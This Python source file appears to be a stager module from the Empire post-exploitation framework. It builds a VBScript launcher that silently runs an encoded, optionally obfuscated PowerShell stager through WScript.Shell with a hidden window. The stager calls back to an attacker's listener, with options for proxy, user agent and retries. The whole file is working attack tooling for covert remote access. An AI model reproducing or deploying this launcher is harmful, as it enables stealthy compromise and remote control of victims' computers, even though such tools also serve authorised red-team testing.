from lib.common import helpers

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'VBS Launcher',

            'Author': ['@harmj0y', '@enigma0x3'],

            'Description': ('Generates a .vbs launcher for Empire.'),

            'Comments': [
                'https://github.com/enigma0x3/Powershell-Infection'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output .vbs launcher to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/launcher.vbs'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\PS\12467'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']
        
        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True
            if "launcher" in obfuscateCommand.lower() and "ps" not in obfuscateCommand.lower():
                print helpers.color("[!] Only 'PS' Invoke-Obfuscation Launcher is currently support for launcher_vbs")
                return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            code = "Dim objShell\n"
            code += "Set objShell = WScript.CreateObject(\"WScript.Shell\")\n"
            code += "command = \""+launcher.replace("\"", "\"+Chr(34)+\"")+"\"\n"
            code += "objShell.Run command,0\n"
            code += "Set objShell = Nothing\n"

            return code
